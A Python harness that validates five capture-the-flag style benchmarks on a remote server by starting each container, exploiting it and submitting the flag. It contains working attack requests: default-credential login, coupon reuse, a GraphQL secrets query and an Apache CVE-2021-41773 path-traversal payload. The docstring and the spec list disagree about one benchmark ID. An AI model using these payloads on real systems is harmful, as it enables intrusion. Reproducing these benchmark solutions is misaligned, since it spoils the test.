#!/usr/bin/env python3
"""
Validate five real benchmarks (one per category) on the remote VPS by:
- Starting the container via dashboard API
- Exploiting the app to retrieve the flag
- Submitting the flag to the dashboard API
- Stopping the container

Benchmarks:
- EASY-001 (CSRF): login, change password, read /dashboard
- MED-014 (Coupon reuse): apply coupon + two purchases returns flag
- HARD-002 (XSS admin): GET /admin contains flag
- VHARD-006 (GraphQL): query allSecrets { flagValue }
- CVE-001 (Apache 2.4.49): path traversal to /flag.txt

Usage:
  python scripts/validate_five_benchmarks.py --api http://139.59.80.137:5500
"""

import argparse
import time
import re
import sys
from dataclasses import dataclass
from typing import Optional, Tuple

import requests


@dataclass
class BenchSpec:
    id: str
    port: int


def api_start(api_base: str, bench_id: str) -> dict:
    r = requests.post(
        f"{api_base}/benchmark/{bench_id}/start",
        json={"force_stop_others": True, "timeout_minutes": 30},
        timeout=20,
    )
    r.raise_for_status()
    return r.json()


def api_stop(api_base: str, bench_id: str) -> dict:
    r = requests.post(f"{api_base}/benchmark/{bench_id}/stop", timeout=20)
    r.raise_for_status()
    return r.json()


def api_submit_flag(api_base: str, bench_id: str, flag: str) -> dict:
    r = requests.post(
        f"{api_base}/benchmark/{bench_id}/submit-flag",
        json={"flag": flag},
        timeout=20,
    )
    r.raise_for_status()
    return r.json()


def wait_until_running(api_base: str, bench_id: str, timeout_s: int = 45) -> bool:
    for _ in range(timeout_s):
        try:
            rs = requests.get(f"{api_base}/containers/status", timeout=8).json()
            c = next((c for c in rs.get("containers", []) if c.get("benchmark_id") == bench_id), None)
            if c and c.get("health_status") in ("healthy", "none", "starting"):
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


def extract_flag(text: str) -> Optional[str]:
    m = re.search(r"S7BEN\{[^}]+\}", text)
    return m.group(0) if m else None


def exploit_easy_001(host: str, port: int) -> Optional[str]:
    base = f"http://{host}:{port}"
    s = requests.Session()
    # Login
    s.post(f"{base}/login", data={"username": "admin", "password": "admin123"}, timeout=10, allow_redirects=True)
    # Change password (CSRF simulation)
    s.post(
        f"{base}/change-password",
        data={"new_password": "hacked", "confirm_password": "hacked"},
        timeout=10,
        allow_redirects=True,
    )
    # Dashboard contains flag
    r = s.get(f"{base}/dashboard", timeout=10)
    return extract_flag(r.text)


def exploit_med_014(host: str, port: int) -> Optional[str]:
    base = f"http://{host}:{port}"
    s = requests.Session()
    # Apply coupon
    s.post(f"{base}/apply-coupon", json={"code": "SAVE50"}, timeout=10)
    # Purchase twice
    s.post(f"{base}/purchase", json={}, timeout=10)
    r = s.post(f"{base}/purchase", json={}, timeout=10)
    try:
        j = r.json()
        return j.get("flag")
    except Exception:
        return None


def exploit_hard_002(host: str, port: int) -> Optional[str]:
    base = f"http://{host}:{port}"
    r = requests.get(f"{base}/admin", timeout=10)
    return extract_flag(r.text)


def exploit_vhard_006(host: str, port: int) -> Optional[str]:
    base = f"http://{host}:{port}"
    q = {"query": "query { allSecrets { flagValue } }"}
    r = requests.post(f"{base}/graphql", json=q, timeout=12)
    try:
        data = r.json()
        secrets = data.get("data", {}).get("allSecrets", [])
        for s in secrets:
            flag = s.get("flagValue")
            if isinstance(flag, str) and flag.startswith("S7BEN{"):
                return flag
    except Exception:
        pass
    return None


def exploit_cve_001(host: str, port: int) -> Optional[str]:
    base = f"http://{host}:{port}"
    # CVE-2021-41773 traversal
    path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt"
    r = requests.get(f"{base}{path}", timeout=10)
    return extract_flag(r.text)


def run_case(api_base: str, host: str, spec: BenchSpec, exploit_fn) -> Tuple[bool, str]:
    print(f"\n=== {spec.id} on {host}:{spec.port} ===")
    try:
        api_start(api_base, spec.id)
    except Exception as e:
        return False, f"start failed: {e}"

    if not wait_until_running(api_base, spec.id, timeout_s=60):
        api_stop(api_base, spec.id)
        return False, "container not healthy"

    flag = None
    try:
        flag = exploit_fn(host, spec.port)
    except Exception as e:
        err = str(e)
        api_stop(api_base, spec.id)
        return False, f"exploit error: {err}"

    if not flag:
        api_stop(api_base, spec.id)
        return False, "flag not found"

    print(f"[+] Found flag: {flag}")
    try:
        sub = api_submit_flag(api_base, spec.id, flag)
        ok = bool(sub.get("correct")) or sub.get("status") == "success"
        if not ok:
            api_stop(api_base, spec.id)
            return False, f"submit rejected: {sub}"
    except Exception as e:
        api_stop(api_base, spec.id)
        return False, f"submit failed: {e}"

    api_stop(api_base, spec.id)
    return True, "ok"


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--api", required=True, help="Dashboard API base, e.g. http://139.59.80.137:5500/api or http://...:5500")
    p.add_argument("--host", default="139.59.80.137", help="Benchmark host/IP")
    args = p.parse_args()

    api_base = args.api.rstrip("/")
    if not api_base.endswith("/api"):
        api_base = api_base + "/api"

    # Resolve ports from local registry
    specs = [
        BenchSpec("S7BEN-EASY-001", 5001),
        BenchSpec("S7BEN-MED-014", 5043),
        BenchSpec("S7BEN-HARD-002", 5051),
        BenchSpec("S7BEN-HARD-020", 5057),
        BenchSpec("S7BEN-CVE-001", 5090),
    ]
    exploits = [
        exploit_easy_001,
        exploit_med_014,
        exploit_hard_002,
        exploit_vhard_006,
        exploit_cve_001,
    ]

    results = []
    for spec, fn in zip(specs, exploits):
        ok, msg = run_case(api_base, args.host, spec, fn)
        results.append((spec.id, ok, msg))
        print(f"[RESULT] {spec.id}: {'PASS' if ok else 'FAIL'} - {msg}")

    passed = sum(1 for _, ok, _ in results if ok)
    print(f"\nSummary: {passed}/5 passed")
    for bid, ok, msg in results:
        print(f" - {bid}: {'PASS' if ok else 'FAIL'} ({msg})")

    sys.exit(0 if passed == 5 else 1)


if __name__ == "__main__":
    main()

